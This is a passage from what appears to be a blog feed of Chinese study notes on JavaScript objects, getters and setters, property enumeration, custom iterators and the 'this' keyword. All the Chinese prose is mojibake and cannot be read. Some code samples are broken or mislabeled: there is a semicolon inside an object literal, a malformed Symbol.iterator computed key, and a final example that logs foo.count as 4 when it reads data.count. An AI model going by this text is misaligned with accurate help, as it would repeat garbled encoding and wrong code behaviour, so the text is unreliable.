ä¸­çš„æ˜¾å¼å®šä¹‰ï¼ŒäºŒè€…éƒ½ä¼šåœ¨å¯¹è±¡ä¸­åˆ›å»ºä¸€ä¸ªä¸ä¼šåŒ…å«å€¼çš„å±žæ€§ï¼Œå¯¹äºŽæ•´ä¸ªå±žæ€§çš„è®¿é—®ä¼šè‡ªåŠ¨è°ƒç”¨ä¸€ä¸ªéšè—å‡½æ•°ï¼Œå®ƒçš„è¿”å›žå€¼ä¼šè¢«å½“åšå±žæ€§è®¿é—®çš„è¿”å›žå€¼ï¼š 12345678var myObject = &#123; // ç»™ a å®šä¹‰ä¸€ä¸ª getter get a()&#123; return 2; &#125;&#125;myObject.a = 3;myObject.a; // 2 ç”±äºŽæˆ‘ä»¬åªå®šä¹‰äº† a çš„ getter,æ‰€ä»¥å¯¹ a çš„å€¼è¿›è¡Œè®¾ç½®æ—¶ set æ“ä½œä¼šå¿½ç•¥èµ‹å€¼æ“ä½œï¼Œä¸ä¼šæŠ›å‡ºé”™è¯¯ã€‚è€Œä¸”å³ä¾¿æœ‰åˆæ³•çš„ setter,ç”±äºŽæˆ‘ä»¬å®šä¹‰çš„ getter åªä¼šè¿”å›ž 2ï¼Œæ‰€ä»¥ set æ“ä½œæ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚ ä¸ºäº†è®©å±žæ€§æ›´åŠ åˆç†ï¼Œè¿˜åº”è¯¥å®šä¹‰ setter,å’ŒæœŸæœ›çš„ä¸€æ ·ï¼Œsetter ä¼šè¦†ç›–å•ä¸ªå±žæ€§é»˜è®¤çš„ [[Put]] ï¼ˆä¹Ÿç§°ä¸ºèµ‹å€¼ï¼‰æ“ä½œã€‚é€šå¸¸æ¥è¯´ï¼Œgetter å’Œ setter æ˜¯æˆå¯¹å‡ºçŽ°çš„ï¼ˆåªå®šä¹‰ä¸€ä¸ªçš„è¯é€šå¸¸ä¼šäº§ç”Ÿæ„æ–™ä¹‹å¤–çš„è¡Œä¸ºï¼‰ï¼š 1234567891011var myObject = &#123; // ç»™ a å®šä¹‰ä¸€ä¸ª getter get a()&#123; return this._a_; &#125;, set a(val)&#123; this._a_ = val*2; &#125;, &#125;myObject.a = 2;myObject.a; // 4 ä¸Šä¾‹ä¸­ï¼Œå®žé™…æŠŠèµ‹å€¼ï¼ˆ[[Put]]ï¼‰æ“ä½œä¸­çš„å€¼2å­˜å‚¨åˆ°äº†å¦ä¸€ä¸ªå˜é‡_a_ä¸­ï¼Œè¿™ä¸ªåç§°çš„å‘½åæ–¹å¼æ˜¯ä¸€ä¸ªæƒ¯ä¾‹ï¼Œæ²¡æœ‰ä»»ä½•ç‰¹æ®Šçš„è¡Œä¸ºâ€”â€”å’Œæ™®é€šå±žæ€§ä¸€æ ·ã€‚ å­˜åœ¨æ€§å‰é¢è¯´åˆ°ï¼ŒmyObject.a çš„å±žæ€§è®¿é—®è¿”å›žå€¼å¯èƒ½æ˜¯ undefined ï¼Œä½†æ˜¯è¿™ä¸ªå€¼æœ‰å¯èƒ½æ˜¯å±žæ€§ä¸­å­˜å‚¨çš„ undefined ï¼Œä¹Ÿå¯èƒ½æ˜¯å› ä¸ºå±žæ€§ä¸å­˜åœ¨æ‰€ä»¥è¿”å›ž undefined ï¼Œé‚£ä¹ˆå¦‚ä½•åŒºåˆ†è¿™ä¸¤ç§æƒ…å†µï¼Ÿ æˆ‘ä»¬å¯ä»¥åœ¨ä¸è®¿é—®å±žæ€§å€¼çš„æƒ…å†µä¸‹åˆ¤æ–­å¯¹è±¡æ˜¯å¦å­˜åœ¨è¿™ä¸ªå±žæ€§ï¼š 12345678var myObject = &#123; a:2 &#125;;("a" in myObject); // true ("b" in myObject); // false myObject.hasOwnProperty("a"); // true myObject.hasOwnProperty("b"); // false in æ“ä½œç¬¦ä¼šæ£€æŸ¥å±žæ€§æ˜¯å¦åœ¨å¯¹è±¡åŠå…¶ [[Prototype]]åŽŸåž‹é“¾ä¸­ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒhasOwnPropertyï¼ˆ..ï¼‰åªä¼šæ£€æŸ¥å±žæ€§æ˜¯å¦åœ¨ myObject å¯¹è±¡ä¸­ï¼Œä¸ä¼šæ£€æŸ¥ [[Prototype]] é“¾ã€‚ æ‰€æœ‰çš„æ™®é€šå¯¹è±¡éƒ½å¯ä»¥é€šè¿‡å¯¹ Object.prototype çš„å§”æ‰˜æ¥è®¿é—® hasOwnProperty(..)ï¼Œä½†æ˜¯æœ‰çš„å¯¹è±¡å¯èƒ½æ²¡æœ‰è¿žæŽ¥åˆ° Object.prototype(é€šè¿‡ Object.create(null) æ¥åˆ›å»ºçš„)ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒhasOwnPropertyå‡½æ•°å°±å¯èƒ½ä¼šå¤±è´¥ è¿™æ—¶å€™å¯ä»¥ä½¿ç”¨ä¸€ç§æ›´åŠ å¼ºç¡¬çš„æ–¹æ³•æ¥åˆ¤æ–­ï¼šObject.prototype.hasOwnProperty.call(myObject,â€aâ€);ç›´æŽ¥æ˜¾ç¤ºç»‘å®šã€‚ in æ“ä½œç¬¦å¯ä»¥æ£€æµ‹å®¹å™¨å†…æ˜¯å¦æœ‰æŸä¸ªå€¼ã€‚ä½†æ˜¯å®ƒå®žé™…ä¸Šæ£€æŸ¥çš„æ˜¯æŸä¸ªå±žæ€§åæ˜¯å¦å­˜åœ¨ã€‚å¯¹äºŽæ•°ç»„æ¥è¯´ï¼Œè¿™ä¸ªåŒºåˆ«å¾ˆé‡è¦ï¼Œ4 in [2,4,6] çš„ç»“æžœæ˜¯ false,å› ä¸ºè¿™ä¸ªæ•°ç»„ä¸­åŒ…å«çš„å±žæ€§åæ²¡æœ‰4. 1.æžšä¸¾12345678910111213141516171819var myObject = &#123;&#125;Object.defineProperty(myObject/*ç›®æ ‡å¯¹è±¡*/,"a"/*å±žæ€§å*/ï¼Œ&#123; value:2, // è®© a åƒæ™®é€šå±žæ€§ä¸€æ ·å¯ä»¥æžšä¸¾ enumerable:true&#125;)Object.defineProperty(myObject/*ç›®æ ‡å¯¹è±¡*/,"b"/*å±žæ€§å*/ï¼Œ&#123; value:3, // è®© a ä¸å¯æžšä¸¾ enumerable:false&#125;)myObject.b; // 3("b" in myObject); // true myObject.hasOwnProperty("b"); // true for(var k in myObject)&#123; console.log(k,myObject[k]);&#125;// "a" 2 å¯ä»¥çœ‹åˆ°ï¼ŒmyObject.b ç¡®å®žæœ‰å€¼ï¼Œå¯æ˜¯ä¸ä¼šå‡ºçŽ° for â€¦ in å¾ªçŽ¯ä¸­ï¼ŒåŽŸå› å°±æ˜¯ â€œå¯æžšä¸¾â€ ç›¸å½“äºŽ â€œå¯ä»¥å‡ºçŽ°åœ¨å¯¹è±¡å±žæ€§çš„éåŽ†ä¸­â€ ä¹Ÿå¯ä»¥é€šè¿‡å¦å¤–ä¸€ç§æ–¹å¼æ¥åŒºåˆ†å±žæ€§æ˜¯å¦å¯ä»¥æžšä¸¾ï¼š 12345678910111213141516var myObject = &#123;&#125;Object.defineProperty(myObject/*ç›®æ ‡å¯¹è±¡*/,"a"/*å±žæ€§å*/ï¼Œ&#123; value:2, // è®© a åƒæ™®é€šå±žæ€§ä¸€æ ·å¯ä»¥æžšä¸¾ enumerable:true&#125;)Object.defineProperty(myObject/*ç›®æ ‡å¯¹è±¡*/,"b"/*å±žæ€§å*/ï¼Œ&#123; value:3, // è®© a ä¸å¯æžšä¸¾ enumerable:false&#125;)myObject.propertyIsEnumerable("a"); // truemyObject.propertyIsEnumerable("b"); // falseObject.keys(myObject); // ["a"]Object.getOwnPropertyNames(myObject); // ["a","b"] propertyIsEnumerable(..) ä¼šæ£€æŸ¥ç»™å®šçš„å±žæ€§åæ˜¯å¦ç›´æŽ¥å­˜åœ¨äºŽå¯¹è±¡ä¸­ï¼ˆè€Œä¸æ˜¯åŽŸåž‹é“¾ä¸Šï¼‰å¹¶ä¸”æ»¡è¶³ enumerableï¼štrue. Object.keys(..) ä¼šè¿”å›žä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«æ‰€æœ‰å¯æžšä¸¾çš„å±žæ€§ï¼ŒObject.getOwnPropertyNames(..) ä¼šè¿”å›žä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«æ‰€æœ‰å±žæ€§ï¼Œæ— è®ºæ˜¯å¦å¯æžšä¸¾ã€‚ in å’Œ hasOwnProperty å‡½æ•°çš„åŒºåˆ«åœ¨äºŽæ˜¯å¦æŸ¥æ‰¾ [[Prototype]]é“¾ï¼Œç„¶åŽï¼ŒObject.keys(â€¦)å’Œ getOwnPropertyNames(..) éƒ½åªä¼šæŸ¥æ‰¾å¯¹è±¡ç›´æŽ¥åŒ…å«çš„å±žæ€§ã€‚ å¹¶æ²¡æœ‰å†…ç½®çš„æ–¹æ³•å¯ä»¥èŽ·å– in æ“ä½œç¬¦ä½¿ç”¨ çš„å±žæ€§åˆ—è¡¨ï¼Œä¸è¿‡å¯ä»¥é€’å½’éåŽ†æŸä¸ªå¯¹è±¡çš„æ•´æ¡[[Prototype]] é“¾å¹¶ä¿å­˜æ¯ä¸€å±‚ä¸­ä½¿ç”¨ Object.keys(â€¦)å¾—åˆ°çš„å±žæ€§åˆ—è¡¨â€”â€”åªåŒ…å«å¯æžšä¸¾å±žæ€§ã€‚ éåŽ†å¯¹äºŽæ•°å€¼ç´¢å¼•çš„æ•°ç»„ï¼Œå¯ä»¥ä½¿ç”¨æ ‡å‡†çš„ for å¾ªçŽ¯æ¥éåŽ†å€¼ï¼š 12345var myArray = [1,2,3];for(var i = 0; i &lt; myArray.length; i++)&#123; console.log(myArray[i]);&#125;// 1 2 3 è¿™å®žé™…ä¸Šå¹¶ä¸æ˜¯åœ¨éåŽ†å€¼ï¼Œè€Œæ˜¯éåŽ†ä¸‹æ ‡æ¥æŒ‡å‘å€¼ï¼Œå¦‚ myArray[i]ã€‚ ES5 ä¸­å¢žåŠ äº†ä¸€äº›æ•°ç»„çš„è¾…åŠ©è¿­ä»£å™¨ï¼ŒåŒ…æ‹¬ forEach(..)ã€every(..)å’Œsome(..)ã€‚æ¯ç§è¾…åŠ©è¿­ä»£å™¨éƒ½å¯ä»¥æŽ¥å—ä¸€ä¸ªå›žè°ƒå‡½æ•°å¹¶æŠŠå®ƒåº”ç”¨åˆ°æ•°ç»„çš„æ¯ä¸ªå…ƒç´ ä¸Šï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯å®ƒä»¬å¯¹äºŽå›žè°ƒå‡½æ•°çš„è¿”å›žå€¼çš„å¤„ç†æ–¹å¼ä¸åŒã€‚ forEach(..)ä¼šéåŽ†æ•°ç»„ä¸­æ‰€æœ‰å€¼å¹¶å¿½ç•¥å›žè°ƒå‡½æ•°çš„è¿”å›žå€¼ã€‚every(..)ä¼šä¸€ç›´è¿è¡Œç›´åˆ°å›žè°ƒå‡½æ•°è¿”å›ž false(æˆ–è€… â€œå‡â€å€¼)ï¼Œsome(..)ä¼šä¸€ç›´è¿è¡Œç›´åˆ°å›žè°ƒå‡½æ•°è¿”å›ž true(æˆ–è€… â€˜çœŸâ€œå€¼) every å’Œ some ä¸­ç‰¹æ®Šçš„è¿”å›žå€¼å’Œæ™®é€š for å¾ªçŽ¯ä¸­çš„ break è¯­å¥ç±»ä¼¼ï¼Œå®ƒä»¬ä¼šæå‰ç»ˆæ­¢éåŽ†ã€‚ ä½¿ç”¨ for..in éåŽ†å¯¹è±¡æ˜¯æ— æ³•ç›´æŽ¥èŽ·å–å±žæ€§å€¼çš„ï¼Œå› ä¸ºå®ƒå®žé™…ä¸ŠéåŽ†çš„æ˜¯å¯¹è±¡ä¸­æ‰€æœ‰å¯æžšä¸¾çš„å±žæ€§ã€‚ ES6 ä¸­å¢žåŠ ä¸€ç§ç”¨æ¥éåŽ†æ•°ç»„çš„ for..of å¾ªçŽ¯è¯­æ³•ï¼Œå¯ä»¥ç›´æŽ¥éåŽ†å€¼è€Œä¸æ˜¯ä¸‹æ ‡ï¼š 1234567var myArray = [1,2,3];for(var v of myArray)&#123; console.log(v);&#125;// 1 // 2 // 3 for..of å¾ªçŽ¯é¦–å…ˆä¼šæƒ³è¢«è®¿é—®å¯¹è±¡è¯·æ±‚ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ï¼Œç„¶åŽé€šè¿‡è°ƒç”¨è¿­ä»£å™¨å¯¹è±¡çš„ next() æ–¹æ³•æ¥éåŽ†æ‰€æœ‰è¿”å›žå€¼ã€‚ æ•°ç»„æœ‰å†…ç½®çš„ @@iterator,å› æ­¤ for..of å¯ä»¥ç›´æŽ¥åº”ç”¨åœ¨ æ•°ç»„ä¸Šï¼Œæˆ‘ä»¬ä½¿ç”¨å†…ç½®çš„ @@iteratoræ¥æ‰‹åŠ¨éåŽ†æ•°ç»„ï¼š 123456var myArray = [1,2,3];var it = myArray[Symbol.iterator]();it.next(); // &#123;value:1, done:false&#125;it.next(); // &#123;value:2, done:false&#125;it.next(); // &#123;value:3, done:false&#125;it.next(); // &#123;done:true&#125; æˆ‘ä»¬ä½¿ç”¨ ES6 çš„ç¬¦å· Symbol.iterator æ¥èŽ·å–å¯¹è±¡çš„ @@iteratorå†…éƒ¨å±žæ€§ã€‚å¼•ç”¨ç±»ä¼¼ iterator çš„ç‰¹æ®Šå±žæ€§æ—¶è¦ä½¿ç”¨ç¬¦å·åï¼Œè€Œä¸æ˜¯ç¬¦å·åŒ…å«çš„å€¼ã€‚æ­¤å¤–ï¼Œè™½ç„¶çœ‹èµ·æ¥å¾ˆåƒä¸€ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯ @@iteratoræœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡ï¼Œè€Œæ˜¯ä¸€ä¸ªè¿­ä»£å™¨å¯¹è±¡çš„å‡½æ•°â€”â€”è¿™ç‚¹å¾ˆç²¾å¦™å¹¶ä¸”éžå¸¸é‡è¦ å’Œæ•°ç»„ä¸åŒï¼Œæ™®é€šçš„å¯¹è±¡å¹¶æ²¡æœ‰å†…ç½®çš„@@iteratorï¼Œæ‰€ä»¥æ— æ³•è‡ªåŠ¨å®Œæˆ for..of éåŽ†ã€‚ä¹‹æ‰€ä»¥è¿™æ ·ï¼Œç®€å•æ¥è¯´æ˜¯ä¸ºäº†é¿å…å½±å“æœªæ¥çš„å¯¹è±¡ç±»åž‹ã€‚ å½“ç„¶ï¼Œå¯ä»¥ä¸ªä»»ä½•æƒ³éåŽ†çš„å¯¹è±¡å®šä¹‰ @@iterator ï¼Œä¸¾ä¸ªä¾‹å­ï¼š 1234567891011121314151617181920212223242526272829303132333435var myObject = &#123; a:2, b:3&#125;Object.defineProperty(myObject,Symbol.iterator,&#123; enumerable:false, writable:false, configurable:true, value:function()&#123; var o = this; var idx = 0; var ks = Object.keys(o); return&#123; next:function()&#123; return&#123; value:o[ks[idx++]], done:(idx &gt; ks.length) &#125; &#125; &#125; &#125;&#125;);// æ‰‹åŠ¨éåŽ† myObjectvar it = myObject[Symbol.iterator]();console.log(it.next()); // &#123;value: 2, done: false&#125;console.log(it.next()); // &#123;value: 3, done: false&#125;console.log(it.next()); // &#123;value: undefined, done: true&#125;// ç”¨ for...of éåŽ† myObjectfor(var v of myObject)&#123; console.log(v);&#125;// 2// 3 è¿™é‡Œä½¿ç”¨ Object.defineProperty(â€¦) å®šä¹‰äº†æˆ‘ä»¬è‡ªå·±çš„ @@iterator(ä¸»è¦æ˜¯ä¸ºäº†è®©å®ƒä¸å¯æžšä¸¾)ï¼Œä¸è¿‡æ³¨æ„ã€‚æˆ‘ä»¬æŠŠç¬¦å·å½“åšå¯è®¡ç®—å±žæ€§åã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥ç›´æŽ¥åœ¨å®šä¹‰å¯¹è±¡æ—¶è¿›è¡Œå£°æ˜Žï¼Œæ¯”å¦‚ï¼švar myObject = {a:2,b:3,[Symbol.iterator:function(){/ .. /}]} for .. of å¾ªçŽ¯æ¯æ¬¡è°ƒç”¨ myObject è¿­ä»£å™¨å¯¹è±¡çš„ next æ–¹æ³•æ—¶ï¼Œå†…éƒ¨çš„æŒ‡é’ˆéƒ½ä¼šå‘å‰ç§»åŠ¨å¹¶è¿”å›žå¯¹è±¡å±žæ€§ç±»åˆ«ä¸‹ä¸€ä¸ªå€¼ã€‚ ä»£ç ä¸­çš„éåŽ†éžå¸¸ç®€å•ï¼Œåªæ˜¯ä¼ é€’äº†å±žæ€§æœ¬èº«çš„å€¼ï¼Œä¹Ÿå¯ä»¥åœ¨è‡ªå®šä¹‰æ•°æ®ç»“æž„ä¸Šå®žçŽ°å„ç§å¤æ‚çš„éåŽ†ï¼Œå¯¹äºŽç”¨æˆ·å®šä¹‰çš„å¯¹è±¡æ¥è¯´ï¼Œç»“åˆ for..of å¾ªçŽ¯å’Œè‡ªå®šä¹‰è¿­ä»£å™¨å¯ä»¥ç»„æˆéžå¸¸å¼ºå¤§çš„å¯¹è±¡æ“ä½œå·¥å…·ã€‚ æ¯”å¦‚è¯´ï¼šä¸€ä¸ª Pixel å¯¹è±¡ï¼ˆæœ‰x å’Œ y åæ ‡å€¼ï¼‰åˆ—è¡¨å¯ä»¥æŒ‰ç…§è·ç¦»åŽŸç‚¹çš„ç›´çº¿è·ç¦»æ¥å†³å®šéåŽ†é¡ºåºï¼Œä¹Ÿå¯ä»¥è¿‡æ»¤æŽ‰å¤ªè¿œçš„ç‚¹ï¼Œåªè¦è¿­ä»£å™¨çš„ next() è°ƒç”¨ä¼šè¿”å›ž {value:â€¦} å’Œ {done:true} ï¼ŒES6 ä¸­çš„ forâ€¦of å°±å¯ä»¥éåŽ†å®ƒã€‚ å®žé™…ä¸Šï¼Œç”šè‡³å¯ä»¥å®šä¹‰ä¸ªæ— é™è¿­ä»£å™¨ï¼Œå®ƒæ°¸è¿œä¸ä¼šç»“æŸå¹¶ä¸”æ€»ä¼šè¿”å›žä¸€ä¸ªæ–°å€¼ï¼ˆæ¯”å¦‚éšæœºæ•°ã€é€’å¢žå€¼ã€å”¯ä¸€æ ‡è¯†ç¬¦ç­‰ç­‰ï¼‰ï¼Œä½ æ°¸è¿œä¸ä¼šåœ¨ for..of å¾ªçŽ¯ä¸­ä½¿ç”¨è¿™æ ·çš„è¿­ä»£å™¨ï¼Œå› ä¸ºå®ƒæ°¸è¿œä¸ä¼šç»“æŸï¼Œä½ çš„ç¨‹åºä¼šè¢«æŒ‚èµ·ï¼š 123456789101112131415161718var randoms = &#123; [Symbol.iterator]:function()&#123; return &#123; next:function()&#123; return&#123; value:Math.random(); &#125; &#125; &#125; &#125;&#125;var randoms_pool = [];for(var n of randoms)&#123; randoms_pool.push(n); // ä»¥é˜²æ­¢æ— é™è¿è¡Œï¼ if(randoms_pool.length === 100) break;&#125; è¿™ä¸ªè¿­ä»£å™¨ä¼šç”Ÿæˆâ€œæ— é™ä¸ªâ€éšæœºæ•°ï¼Œå› ä¸ºæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ª break è¯­å¥ï¼Œé˜²æ­¢ç¨‹åºè¢«æŒ‚èµ·ã€‚ å°ç»“JavaScript ä¸­çš„å¯¹è±¡æœ‰å­—é¢å½¢å¼ï¼ˆvar a = {}ï¼‰å’Œæž„é€ å½¢å¼ï¼ˆvar a = new Array(â€¦)ï¼‰ã€‚å­—é¢å½¢å¼æ›´å¸¸ç”¨ï¼Œä¸è¿‡æœ‰æ—¶æž„é€ å½¢å¼å¯ä»¥æä¾›æ›´å¤šé€‰é¡¹ã€‚ å¾ˆå¤šäººéƒ½è®¤ä¸º â€œJavaScript ä¸­ä¸‡ç‰©éƒ½æ˜¯å¯¹è±¡â€ï¼Œè¿™æ˜¯é”™è¯¯çš„ï¼Œå¯¹è±¡æ˜¯6ä¸ªï¼ˆæˆ–è€…7ä¸ªï¼‰åŸºç¡€ç±»åž‹ä¹‹ä¸€ã€‚å¯¹è±¡æœ‰åŒ…æ‹¬ function åœ¨å†…çš„å­ç±»åž‹ï¼Œä¸åŒ å­ç±»åž‹å…·æœ‰ä¸åŒçš„è¡Œä¸ºï¼Œæ¯”å¦‚å†…éƒ¨æ ‡ç­¾ [Object Array] è¡¨ç¤ºè¿™æ˜¯å¯¹è±¡çš„å­ç±»åž‹æ•°ç»„ã€‚ å¯¹è±¡å°±æ˜¯é”®/å€¼å¯¹çš„é›†åˆï¼Œå¯ä»¥é€šè¿‡ .propName æˆ–è€… [â€œpropNameâ€] è¯­æ³•æ¥èŽ·å–å±žæ€§å€¼ã€‚è®¿é—®å±žæ€§æ—¶ï¼Œå¼•æ“Žå®žé™…ä¸Šä¼šè°ƒç”¨å†…éƒ¨çš„é»˜è®¤ [[Get]] æ“ä½œï¼ˆåœ¨è®¾ç½®å±žæ€§å€¼æ˜¯ [[Put]]ï¼‰ï¼Œ[[Get]] æ“ä½œç¬¦ä¼šæ£€æŸ¥å¯¹è±¡æœ¬çœæ˜¯å¦åŒ…å«è¿™ä¸ªå±žæ€§ï¼Œå¦‚æžœæ²¡æœ‰æ‰¾åˆ°çš„è¯è¿˜æ˜¯ä¼šæŸ¥æ‰¾ [[Prototype]]é“¾ã€‚ å±žæ€§çš„ç‰¹æ€§å¯ä»¥é€šè¿‡å±žæ€§æè¿°ç¬¦æ¥æŽ§åˆ¶ï¼Œæ¯”å¦‚ writable å’Œ configurable ï¼Œæ­¤å¤–ï¼Œå¯ä»¥ä½¿ç”¨ Object.preventExtensions(..)ã€Object.seal(..) å’Œ Object.freeze(..) æ¥è®¾ç½®å¯¹è±¡ï¼ˆåŠå…¶å±žæ€§ï¼‰çš„ä¸å¯å˜æ€§ç•Œåˆ«ã€‚ å±žæ€§ä¸ä¸€å®šåŒ…å«å€¼â€”â€”å®ƒä»¬å¯èƒ½æ˜¯å…·å¤‡ getter/setter çš„â€è®¿é—®æè¿°ç¬¦â€œã€‚æ­¤å¤–ï¼Œå±žæ€§å¯ä»¥æ˜¯å¯æžšä¸¾æˆ–è€…ä¸å¯æžšä¸¾çš„ï¼Œè¿™å†³å®šäº†å®ƒä»¬æ˜¯å¦ä¼šå‡ºçŽ°åœ¨ for .. in å¾ªçŽ¯ä¸­ã€‚ å¯ä»¥ä½¿ç”¨ ES6 çš„ for..of è¯­æ³•æ¥éåŽ†å¯¹è±¡æ•°æ®ç»“æž„ï¼ˆæ•°ç»„ã€å¯¹è±¡ç­‰ç­‰ï¼‰ä¸­çš„å€¼ï¼Œfor..of ä¼šå¯»æ‰¾å†…ç½®æˆ–è€…è‡ªå®šä¹‰çš„ @@iterator å¯¹è±¡å¹¶è°ƒç”¨å®ƒçš„ next() æ–¹æ³•æ¥éåŽ†æ•°æ®å€¼ã€‚]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>ä½ ä¸çŸ¥é“çš„JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”this å’ŒåŽŸåž‹å¯¹è±¡]]></title>
    <url>%2F2019-01-18-%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84JavaScript(%E4%B8%8A)%E2%80%94%E2%80%94this%E5%92%8C%E5%8E%9F%E5%9E%8B%E5%AF%B9%E8%B1%A1.html</url>
    <content type="text"><![CDATA[è¿™ä¸ªç³»åˆ—çš„ä½œå“æ˜¯ä¸Šä¸€æ¬¡å½“å½“ç½‘æœ‰æ´»åŠ¨ä¹°çš„ï¼Œè®°å¾—æ˜¯ä¸Šä¸€å¹´ä¹æœˆä»½å¼€å­¦å­£çš„æ—¶å€™äº†ã€‚åŽé¢ä¸€ç›´æœ‰å…¶ä»–çš„äº‹æƒ…ï¼Œæˆ–è€…è‡ªèº«ä¸€äº›å› ç´ ï¼Œè¿Ÿè¿Ÿæ²¡æœ‰å¼€å°è¿™æœ¬ä¹¦ã€‚ä»Šå¤©ç«‹ä¸‹ä¸€ä¸ª flagï¼Œå¸Œæœ›å¯ä»¥åœ¨ä¸¤ä¸ªæœˆå†…çœ‹å®Œå¹¶è®°å½•è¿™ä¸ªç³»åˆ—çš„ä¸‰æœ¬ä¹¦ï¼Œä¿æŒå­¦ä¹ çš„æ¿€æƒ…ï¼Œä¸æ–­å¼¥è¡¥è‡ªå·±çš„åŸºç¡€ä¸å¤Ÿæ‰Žå®žçš„ç¼ºç‚¹ã€‚ ä½œè€…çš„github ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ï¼Œè‡ªå·±æœã€‚ ä½ ä¸çŸ¥é“çš„JavaScript(ä¸Š)â€”â€”this å’ŒåŽŸåž‹å¯¹è±¡å…³äºŽthisä¸ºä»€ä¹ˆè¦ç”¨ this123456789101112131415161718function identify()&#123; return this.name.toUpperCase();&#125;function speak()&#123; var greeting = `Hello, I am $&#123;identify.call(this)&#125;`; console.log(greeting);&#125;var me = &#123; name:'Kyle'&#125;var you = &#123; name:'Reader'&#125;identify.call(me); // KYLEidentify.call(you); // Readerspeak.call(me); // Hello,I am KYLEspeak.call(you); // Hello,I am READER è¿™æ®µä»£ç å¯ä»¥åœ¨ä¸åŒä¸Šä¸‹æ–‡å¯¹è±¡ï¼ˆme å’Œ youï¼‰ä¸­é‡å¤ä½¿ç”¨å‡½æ•° identify å’Œ speak ï¼Œä¸ç”¨é’ˆå¯¹æ¯ä¸ªå¯¹è±¡ç¼–å†™ä¸åŒçš„å‡½æ•°ã€‚ å¦‚æžœä¸ä½¿ç”¨ this,é‚£ä¹ˆå°±éœ€è¦ç»™è¿™ä¸¤ä¸ªå‡½æ•°æ˜¾å¼ä¼ å…¥ä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ã€‚ 123456789function identify(context)&#123; return context.toUpperCase();&#125;function speak(context)&#123; var greeting = `Hello, I am $&#123;identify(context)&#125;`; console.log(greeting);&#125;identify(you); // READERspeak(me);// hello,I am KYLE ç„¶è€Œï¼Œthis æä¾›äº†ä¸€ç§æ›´ä¼˜é›…çš„æ–¹å¼éšå¼ä¼ é€’ä¸€ä¸ªå¯¹è±¡å¼•ç”¨ï¼Œå› ä¸ºå¯ä»¥å°† API è®¾è®¡å¾—æ›´åŠ ç®€æ´å¹¶ä¸”æ˜“äºŽå¤ç”¨ã€‚éšç€ä½¿ç”¨æ¨¡å¼çš„å¤æ‚ç¨‹åºæé«˜ï¼Œæ˜¾å¼ä¼ é€’ä¸Šä¸‹æ–‡å¯¹è±¡ä¼šè®©ä»£ç å˜å¾—è¶Šæ¥è¶Šæ··ä¹±ï¼Œä½¿ç”¨ this åˆ™ä¸ä¼šè¿™æ ·ã€‚ è¯¯è§£æœ‰ä¸¤ç§å¸¸è§äºŽ å¯¹äºŽ this çš„è§£é‡Šï¼Œä½†æ˜¯å®ƒä»¬éƒ½æ˜¯é”™è¯¯çš„ã€‚ æŒ‡å‘è‡ªèº«äººä»¬å¾ˆå®¹æ˜“æŠŠ this ç†è§£æˆæŒ‡å‘å‡½æ•°æœ¬çœï¼Œè¿™ä¸ªæŽ¨æ–­ä»Žè‹±è¯­çš„è¯­æ³•è§’åº¦æ˜¯è¯´å¾—é€šçš„ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆéœ€è¦ä»Žå‡½æ•°å†…éƒ¨å¼•ç”¨å‡½æ•°è‡ªèº«å‘¢ï¼Ÿå¸¸è§çš„åŽŸå› æ˜¯é€’å½’ï¼ˆä»Žå‡½æ•°å†…éƒ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼‰æˆ–è€…å¯ä»¥å†™ä¸€ä¸ªåœ¨ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨åŽè‡ªå·±è§£é™¤ç»‘å®šçš„äº‹ä»¶å¤„ç†å™¨ã€‚ è®°å½• foo è¢«è°ƒç”¨çš„æ¬¡æ•°ï¼Œæ€è€ƒä¸‹é¢çš„ä»£ç ã€‚ 1234567891011121314151617function foo(num)&#123; console.log("foo:"+num); // è®°å½•foo è¢«è°ƒç”¨çš„æ¬¡æ•° this.count++;&#125;foo.count = 0;var i;for(i = 0; i &lt; 10; i++)&#123; if(i &gt; 5)&#123; foo(i) &#125;&#125;// foo:6// foo:7// foo:8// foo:9console.log(foo.count); // 0 ä¸ºä»€ä¹ˆï¼Ÿ console.log è¯­å¥äº§ç”Ÿäº† 4æ¡è¾“å‡ºï¼Œè¯æ˜Ž foo(..)ç¡®å®žæ˜¯è¢«è°ƒç”¨äº†4æ¬¡ï¼Œä½†æ˜¯ foo.count çš„å€¼ä»ç„¶æ˜¯0ï¼Œæ˜¾ç„¶ä»Žå­—é¢æ„æ€æ¥ç†è§£ this æ˜¯é”™è¯¯çš„ã€‚ä¸Šé¢è¿™æ®µä»£ç å…¶å®žåœ¨æ— æ„ä¹‹ä¸­ï¼Œä¼šåˆ›å»ºä¸€ä¸ªå…¨å±€çš„ count å˜é‡ï¼Œå®ƒçš„å€¼ä¸º NaNã€‚ å¯èƒ½æœ‰äº›äººä¼šé€šè¿‡åˆ›å»ºå¦ä¸€ä¸ªå¸¦æœ‰ count å±žæ€§çš„å¯¹è±¡ã€‚ 12345678910111213141516171819function foo(num)&#123; console.log("foo:"+num); // è®°å½•foo è¢«è°ƒç”¨çš„æ¬¡æ•° data.count++;&#125;var data = &#123; count:0&#125;var i;for(i = 0; i &lt; 10; i++)&#123; if(i &gt; 5)&#123; foo(i) &#125;&#125;// foo:6// foo:7// foo:8// foo:9console.log(foo.count); // 4 